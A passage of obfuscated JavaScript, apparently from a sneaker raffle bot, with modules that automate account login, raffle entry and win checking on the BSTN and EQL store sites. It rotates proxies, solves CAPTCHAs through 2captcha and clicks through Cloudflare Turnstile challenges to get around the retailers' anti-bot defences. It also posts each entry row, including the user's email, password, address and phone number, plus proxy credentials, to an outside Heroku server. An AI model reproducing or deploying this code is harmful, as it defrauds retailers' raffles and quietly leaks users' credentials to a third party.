                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x485886) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x525ab9['name'] + ']\x20Task\x20' + (_0x411420 + 0x1) + '\x20:\x20' + _0x485886));
                                var _0x29d618 = _0x485886, _0x541b75 = await _0x105954(null, _0x525ab9, 'ver', !![], _0x29d618);
                                const _0x3a4a08 = { 'errorDEVMSG': { 'embeds': [_0x541b75] } };
                                _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x3a4a08['errorDEVMSG']), await _0x4d8e61(_0x369064, _0x3a4a08['errorDEVMSG']);
                            } finally {
                                if (_0x40bd71)
                                    _0x40bd71['close']();
                                if (_0x471d0d == 'yes' && _0x2dc840 != 0x5)
                                    return console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x525ab9['name'] + ']\x20Task\x20' + (_0x411420 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2dc840 + '\x20/\x205)')), _0x1d5dde--, _0x2dc840 = _0x2dc840 + 0x1, _0xe33130(_0x525ab9, _0x438a43, _0xc984fe, _0x411420, _0x2dc840);
                                _0x471d0d == 'yes' && _0x2dc840 >= 0x5 && (_0x471d0d = 'no', _0x2dc840 = 0x0), _0x1d5dde--, console['log'](_0x5b438b() + '\x20[' + _0x525ab9['name'] + ']\x20Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                            }
                        }
                        if (_0xf93760 == _0x516dfa['length'] - 0x1) {
                            await _0xe33130(_0x32a751, _0x516dfa, _0x20942f, _0xf93760, 0x0);
                            return;
                        }
                        _0xe33130(_0x32a751, _0x516dfa, _0x20942f, _0xf93760, 0x0), await _0x415e3e(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x37787a, _0xe46184, _0x29731a) {
                    var _0x40caf8 = 0x0, _0x2c311b = _0xe46184;
                    for (var _0x3ad09b = 0x0; _0x3ad09b < _0xe46184['length']; _0x3ad09b++) {
                        maxTasks = Number(_0x165c4b['threads']);
                        while (_0x40caf8 >= maxTasks) {
                            await _0x415e3e(_0x165c4b['delay']);
                        }
                        let _0x1234b4 = ![];
                        async function _0x23bae0(_0x27dcdd, _0x483f11, _0x3a0352, _0x4ad924, _0x3e3408) {
                            _0x40caf8++, _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x165c4b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x128235, _0x44c8ef = _0x483f11[_0x4ad924];
                            try {
                                await _0x3da21c(_0x483f11, _0x4ad924);
                            } catch {
                                _0x386ae0 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x48cfa6(_0x2f40e2) {
                                const _0x3b9540 = _0xaf9669['readFileSync']('../successful-tasks.csv', 'utf8'), _0x373a19 = _0x6aec87['parse'](_0x3b9540, { 'header': !![] })['data'];
                                let _0x3588a0 = ![];
                                for (var _0x3a46ae of _0x373a19) {
                                    if (_0x3a46ae['Url'] == _0x2f40e2['Url'] && _0x3a46ae['Email'] == _0x2f40e2['Email']) {
                                        _0x3588a0 = !![];
                                        break;
                                    }
                                }
                                return _0x3588a0;
                            }
                            _0x424e52(_0x27dcdd['name'] + '\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20/\x20' + _0x483f11['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                            var _0x22c681 = Math['round'](Math['random']() * (_0x3a0352['length'] - 0x1)), _0x5afdc8 = _0x3a0352[_0x22c681]['split'](':'), _0x1a51fe;
                            let _0x2c983e = ![], _0x386ae0 = 'no';
                            try {
                                if (await _0x48cfa6(_0x483f11[_0x4ad924]) == !![]) {
                                    console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x2c983e = !![], _0x1234b4 = !![];
                                    return;
                                }
                                try {
                                    _0x1a51fe = await _0x275ae5['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5afdc8[0x0] + ':' + _0x5afdc8[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x1a51fe = await _0x275ae5['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5afdc8[0x0] + ':' + _0x5afdc8[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x48d716 = await _0x1a51fe['newPage'](), _0x99b53b = await _0x48d716['target']()['createCDPSession'](), { windowId: _0x29aef2 } = await _0x99b53b['send']('Browser.getWindowForTarget');
                                await _0x48d716['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x24452e = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x48d716['authenticate']({
                                    'username': '' + _0x5afdc8[0x2],
                                    'password': '' + _0x5afdc8[0x3]
                                }), console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x48d716['goto']('' + _0x483f11[_0x4ad924]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x415e3e(0x1388);
                                var _0x10b28e = await _0x48d716['$']('#turnstile-wrapper');
                                if (_0x10b28e) {
                                    console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x415e3e(0x2710);
                                    const _0x146e65 = await _0x48d716['$']('#turnstile-wrapper');
                                    if (_0x146e65)
                                        try {
                                            await _0x146e65['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x48d716['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x11f234 = await _0x48d716['$']('#turnstile-wrapper');
                                        if (_0x11f234)
                                            try {
                                                await _0x11f234['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x48d716['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x99b53b['send']('Browser.setWindowBounds', {
                                    'windowId': _0x29aef2,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x415e3e(0x1388), await _0x48d716['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x48d716['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x415e3e(0x1f4), console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Logging\x20in'), await _0x48d716['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x30fb50 => _0x30fb50['click']()), await _0x48d716['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x48d716['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x415e3e(0x7d0), await _0x48d716['waitForSelector']('#email-login'), await _0x48d716['type']('#email-login', '' + _0x483f11[_0x4ad924]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x415e3e(0xdac), await _0x48d716['waitForSelector']('#password'), await _0x48d716['type']('#password', '' + _0x483f11[_0x4ad924]['Password'], { 'delay': 0xe6 }), await _0x415e3e(0x157c);
                                try {
                                    await _0x48d716['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x486e3c => _0x486e3c['click']());
                                } catch {
                                }
                                try {
                                    await _0x48d716['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x2239b5) {
                                }
                                await _0x415e3e(0x3e8);
                                const _0x3c0b2f = await _0x48d716['$']('.enteredDraw_container__2KmQ_');
                                if (_0x3c0b2f) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x483f11[_0x4ad924]['Size']);
                                try {
                                    if (_0x483f11[_0x4ad924]['Size'] != 'RANDOM') {
                                        var _0x34c492 = _0x483f11[_0x4ad924]['Size']['replace']('.', ',');
                                        const _0x240ccb = await _0x48d716['$x']('//div[contains(text(),\x20\x27' + _0x34c492 + '\x27)]');
                                        await _0x240ccb[0x0]['click']();
                                    } else {
                                        const _0x54f2e2 = await _0x48d716['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x4205c4 = Math['round'](Math['random']() * (_0x54f2e2['length'] - 0x1));
                                        await _0x54f2e2[_0x4205c4]['click']();
                                    }
                                } catch (_0x575a44) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x415e3e(0x1f4);
                                const _0x2647d6 = await _0x48d716['$']('.addressList_addressItem__LE2PB');
                                if (_0x2647d6 && _0x483f11[_0x4ad924]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x48d716['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x415e3e(0x5dc), await _0x48d716['waitForSelector']('#firstname'), await _0x48d716['type']('#firstname', '' + _0x483f11[_0x4ad924]['FirstName']), await _0x415e3e(0x1f4), await _0x48d716['waitForSelector']('#firstname'), await _0x48d716['type']('#lastname', '' + _0x483f11[_0x4ad924]['LastName']), await _0x415e3e(0x1f4), await _0x48d716['waitForSelector']('#firstname'), await _0x48d716['type']('#street', '' + _0x483f11[_0x4ad924]['Address1']), await _0x415e3e(0x1f4), await _0x48d716['waitForSelector']('#firstname'), await _0x48d716['type']('#houseNumber', _0x483f11[_0x4ad924]['HouseNumber'] + '\x20' + _0x483f11[_0x4ad924]['Address2']), await _0x415e3e(0x1f4), await _0x48d716['waitForSelector']('#firstname'), await _0x48d716['select']('#country_code', '' + _0x483f11[_0x4ad924]['Country']), await _0x415e3e(0x1f4), await _0x48d716['type']('#postcode', '' + _0x483f11[_0x4ad924]['Zip']), await _0x415e3e(0x1f4), await _0x48d716['type']('#city', '' + _0x483f11[_0x4ad924]['City']), await _0x415e3e(0x1f4), await _0x48d716['type']('#telephone', '' + _0x483f11[_0x4ad924]['Phone']), await _0x415e3e(0x1f4), await _0x48d716['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x415e3e(0x9c4);
                                try {
                                    await _0x48d716['type']('#instagram_name', '' + _0x483f11[_0x4ad924]['Follower']), await _0x48d716['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x415e3e(0x5dc);
                                try {
                                    await _0x48d716['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x415e3e(0x5dc), await _0x48d716['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x432731 => _0x432731['click']()), await _0x415e3e(0x1388);
                                try {
                                    await _0x48d716['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x48d716['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x483f11[_0x4ad924]['Size'] != 'RANDOM') {
                                        var _0x34c492 = _0x483f11[_0x4ad924]['Size']['replace']('.', ',');
                                        const _0x3b0886 = await _0x48d716['$x']('//div[contains(text(),\x20' + _0x34c492 + ')]');
                                        await _0x3b0886[0x0]['click']();
                                    } else {
                                        const _0x4aa3fd = await _0x48d716['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x4205c4 = Math['round'](Math['random']() * (_0x4aa3fd['length'] - 0x1));
                                        await _0x4aa3fd[_0x4205c4]['click']();
                                    }
                                    await _0x415e3e(0x5dc);
                                    try {
                                        await _0x48d716['hover']('#instagram_name'), await _0x48d716['type']('#instagram_name', '' + _0x483f11[_0x4ad924]['Follower']), await _0x48d716['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3e3408 + '\x20/\x205)');
                                    try {
                                        await _0x48d716['hover']('.checkBox_boxHolder__wLGVe'), await _0x415e3e(0x5dc), await _0x48d716['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x415e3e(0x157c), await _0x48d716['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5b37de => _0x5b37de['click']()), await _0x415e3e(0x1388), await _0x48d716['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x386ae0 = 'no', _0x53db49(_0x483f11[_0x4ad924], _0x27dcdd);
                                try {
                                    prxdata = {
                                        'username': _0x5f9620['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x17783),
                                        'proxy': '' + _0x3a0352[_0x4ad924]
                                    };
                                    var _0x43274f = JSON['stringify'](prxdata);
                                    let _0x32fdd8 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x43274f, _0x32fdd8);
                                } catch (_0x46d834) {
                                }
                                console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x56ba5b = await _0x105954(_0x483f11[_0x4ad924], _0x27dcdd, 'dev', ![]), _0x90d1bc = await _0x105954(_0x483f11[_0x4ad924], _0x27dcdd, 'pub', ![]);
                                const _0x330f85 = {
                                    'succesDEVMSG': { 'embeds': [_0x56ba5b] },
                                    'succesPUBMSG': { 'embeds': [_0x90d1bc] }
                                };
                                let _0x17783 = _0x483f11[_0x4ad924];
                                try {
                                    prxdata = {
                                        'username': _0x5f9620['replace']('#', ''),
                                        'module': _0x27dcdd['name'],
                                        'entrydata': JSON['stringify'](_0x17783),
                                        'proxy': '' + _0x3a0352[_0x4ad924]
                                    };
                                    var _0x43274f = JSON['stringify'](prxdata);
                                    let _0x51066d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x43274f, _0x51066d);
                                } catch (_0xba74a8) {
                                }
                                try {
                                    _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x330f85['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x330f85['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0x3ba9f8, _0x330f85['succesPUBMSG']);
                                } catch (_0x47c62a) {
                                    console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x47c62a));
                                }
                            } catch (_0x6bc025) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20' + _0x6bc025)), _0x386ae0 = 'yes', _0x128235 = '' + _0x6bc025;
                                var _0x3a5bb6 = await _0x105954(_0x483f11[_0x4ad924], _0x27dcdd, 'dev', !![], _0x128235), _0x56ba5b = await _0x105954(_0x483f11[_0x4ad924], _0x27dcdd, 'dev', ![]), _0x90d1bc = await _0x105954(_0x483f11[_0x4ad924], _0x27dcdd, 'pub', ![]);
                                const _0x485cbd = {
                                    'succesDEVMSG': { 'embeds': [_0x56ba5b] },
                                    'succesPUBMSG': { 'embeds': [_0x90d1bc] }
                                };
                                _0x485cbd['errorDEV'] = { 'embeds': [_0x3a5bb6] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x485cbd['errorDEV']), await _0x4d8e61(_0x369064, _0x485cbd['errorDEV']);
                            } finally {
                                _0x1a51fe && _0x1a51fe['close']();
                                if (_0x386ae0 == 'yes' && _0x3e3408 != 0x5)
                                    return console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Task\x20' + (_0x4ad924 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3e3408 + '\x20/\x205)')), _0x3e3408 = _0x3e3408 + 0x1, _0x40caf8--, _0x23bae0(_0x27dcdd, _0x483f11, _0x3a0352, _0x4ad924, _0x3e3408);
                                _0x386ae0 == 'yes' && _0x3e3408 >= 0x5 && _0x4d12b6(_0x483f11[_0x4ad924], _0x27dcdd), !_0x2c983e && (console['log'](_0x5b438b() + '\x20[' + _0x27dcdd['name'] + ']\x20Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay'])), _0x40caf8--;
                            }
                        }
                        _0x23bae0(_0x37787a, _0x2c311b, _0x29731a, _0x3ad09b, 0x0), await _0x415e3e(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x421bc1, _0x3ee740) {
                    var _0x3896d = 0x0, _0x424018;
                    try {
                        const _0x38001e = _0xaf9669['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x424018 = _0x6aec87['parse'](_0x38001e, { 'header': !![] })['data'];
                    } catch (_0x4dd141) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x4e1f50 = 0x0; _0x4e1f50 < _0x424018['length']; _0x4e1f50++) {
                        maxTasks = Number(_0x165c4b['threads']);
                        while (_0x3896d >= maxTasks) {
                            await _0x415e3e(_0x165c4b['delay']);
                        }
                        async function _0x4c8770(_0x30319d, _0x4ffa46, _0x2e1156, _0x4ba9b5, _0x22eee0) {
                            _0x3896d++, _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x165c4b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x274ec8 != 'yes')
                                var _0x274ec8 = '', _0x22eee0 = 0x0;
                            var _0x4737ce;
                            _0x424e52(_0x30319d['name'] + '\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20/\x20' + _0x2e1156['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                            var _0xf8be6d = await _0x105954(_0x2e1156[_0x4ba9b5], _0x30319d, 'acc', ![]);
                            const _0x177694 = { 'succesDEVMSG': { 'embeds': [_0xf8be6d] } }, _0x377ce9 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x46fe63 = Math['round'](Math['random']() * (_0x4ffa46['length'] - 0x1)), _0xb2de09 = _0x4ffa46[_0x46fe63]['split'](':'), _0x23e609;
                            try {
                                _0x23e609 = await _0x275ae5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xb2de09[0x0] + ':' + _0xb2de09[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x23e609 = await _0x275ae5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xb2de09[0x0] + ':' + _0xb2de09[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20:\x20Checking\x20' + _0x2e1156[_0x4ba9b5]['Email']);
                                const _0x1674c9 = await _0x23e609['newPage']();
                                await _0x1674c9['authenticate']({
                                    'username': '' + _0xb2de09[0x2],
                                    'password': '' + _0xb2de09[0x3]
                                }), console['log'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1674c9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1674c9['setRequestInterception'](!![]), _0x1674c9['on']('request', _0x3b6ba2 => {
                                    _0x3b6ba2['resourceType']() === 'image' ? _0x3b6ba2['abort']() : _0x3b6ba2['continue']();
                                });
                                try {
                                    await _0x1674c9['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x1674c9['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x274ec8 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x1674c9['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x415e3e(0x3e8), await _0x1674c9['type']('#email', _0x2e1156[_0x4ba9b5]['Email']), await _0x415e3e(0x1f4), await _0x1674c9['type']('#pass', _0x2e1156[_0x4ba9b5]['Password']), await _0x415e3e(0x1f4), await _0x1674c9['$eval']('#login-form', _0x182e8f => _0x182e8f['submit']());
                                try {
                                    await _0x1674c9['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x415e3e(0x190);
                                const _0x235755 = await _0x1674c9['evaluate'](() => {
                                    const _0x22a9ba = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x22a9ba['map'](_0x4c4b0a => _0x4c4b0a['alt']);
                                }), _0x598c19 = await _0x1674c9['evaluate'](() => {
                                    const _0x40ee73 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x40ee73['map'](_0x460057 => _0x460057['innerHTML']);
                                }), _0x21ec50 = await _0x1674c9['$$']('.raffle-winner');
                                if (_0x21ec50['length'] < 0x1) {
                                    console['log'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x274ec8 = 'no';
                                    return;
                                }
                                console['log'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20:\x20' + _0x21ec50['length'] + '\x20Wins\x20Found!');
                                for (var _0x4b0104 = 0x0; _0x4b0104 < _0x21ec50['length']; _0x4b0104++) {
                                    console['log'](_0x5dc29b['green'](_0x235755[_0x4b0104] + _0x598c19[_0x4b0104]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x3afc74) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20:\x20' + _0x3afc74)), _0x4737ce = '' + _0x3afc74;
                                var _0x491746 = await _0x105954(_0x2e1156[_0x4ba9b5], _0x30319d, 'acc', !![], _0x4737ce);
                                _0x177694['errorDEV'] = { 'embeds': [_0x491746] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x177694['errorDEV']), await _0x4d8e61(_0x369064, _0x177694['errorDEV']), _0x274ec8 = 'yes';
                            } finally {
                                if (_0x23e609)
                                    _0x23e609['close']();
                                if (_0x274ec8 == 'yes' && _0x22eee0 != 0x5)
                                    return console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Task\x20' + (_0x4ba9b5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x22eee0 + '\x20/\x205)')), _0x3896d--, _0x22eee0 = _0x22eee0 + 0x1, _0x4c8770(_0x30319d, _0x4ffa46, _0x2e1156, _0x4ba9b5, _0x22eee0);
                                _0x274ec8 == 'yes' && _0x22eee0 >= 0x5 && (_0x4d12b6(_0x2e1156[_0x4ba9b5], _0x30319d), _0x274ec8 = 'no', _0x22eee0 = 0x0), console['log'](_0x5b438b() + '\x20[' + _0x30319d['name'] + ']\x20Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']), _0x3896d--;
                            }
                        }
                        _0x4c8770(_0x421bc1, _0x3ee740, _0x424018, _0x4e1f50, 0x0), await _0x415e3e(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x1753da, _0x382859, _0x33852c) {
                _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x165c4b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x7c498c = 0x0; _0x7c498c < _0x382859['length']; _0x7c498c++) {
                    var _0x41764f;
                    _0x424e52(_0x1753da['name'] + '\x20Task\x20' + (_0x7c498c + 0x1) + '\x20/\x20' + _0x382859['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                    try {
                        await _0x3da21c(_0x382859, _0x7c498c);
                    } catch {
                        _0x373bf6 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4678c0(_0x160304) {
                        const _0x2a1b7d = _0xaf9669['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4ee858 = _0x6aec87['parse'](_0x2a1b7d, { 'header': !![] })['data'];
                        let _0x1d9413 = ![];
                        for (var _0x51628b of _0x4ee858) {
                            if (_0x51628b['Url'] == _0x160304['Url'] && _0x51628b['Email'] == _0x160304['Email']) {
                                _0x1d9413 = !![];
                                break;
                            }
                        }
                        return _0x1d9413;
                    }
                    if (await _0x4678c0(_0x382859[_0x7c498c]) == !![]) {
                        console['log'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x5107c7 = ![];
                    const _0x3c3a1c = _0xaf9669['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x42efbf = _0x6aec87['parse'](_0x3c3a1c, { 'header': !![] })['data'];
                    for (var _0x25adf3 of _0x42efbf) {
                        _0x25adf3['Email'] == _0x382859[_0x7c498c]['Email'] && (_0x5107c7 = !![]);
                    }
                    if (_0x5107c7 == ![]) {
                        var _0x5cab36;
                        if (_0x382859[_0x7c498c]['Url']['endsWith']('/')) {
                            _0x5cab36 = _0x382859[_0x7c498c]['Url'] + 'register';
                            if (_0x373bf6 != 'yes')
                                var _0x373bf6 = '', _0x5afa21 = 0x0;
                        } else {
                            _0x5cab36 = _0x382859[_0x7c498c]['Url'] + '/register';
                            if (_0x373bf6 != 'yes')
                                var _0x373bf6 = '', _0x5afa21 = 0x0;
                        }
